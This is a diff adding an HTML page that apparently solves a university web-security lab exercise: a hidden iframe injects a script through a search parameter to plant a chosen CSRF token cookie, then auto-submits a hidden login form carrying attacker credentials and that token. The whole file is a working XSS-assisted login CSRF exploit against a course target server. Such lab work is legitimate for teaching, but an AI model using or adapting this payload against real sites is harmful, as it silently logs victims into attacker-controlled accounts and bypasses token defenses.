@@ -1,0 +1,15 @@
+<html><body>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+<iframe name="test" id = "fat" onload=csrf() src="http://trurl.cs.illinois.edu/search?csrfdefense=1&xssdefense=0&q=<script>{document.cookie='csrf_token=139b354cb492f790bcf53ad04d5e6890'}</script>" method= "POST" hidden></iframe>
+  <form name="csrf_form" id="bad" action="http://trurl.cs.illinois.edu/login?csrfdefense=1&xssdefense=0" method="POST">
+    <input type="hidden" name="username" value="attacker"/>
+    <input type="hidden" name="password" value="l33th4x"/>
+    <input type="hidden" id = "token" name="csrf_token" value="139b354cb492f790bcf53ad04d5e6890"/>
+  </form>
+
+<script>
+function csrf(){
+    document.csrf_form.submit();
+}
+</script>
+</body></html>
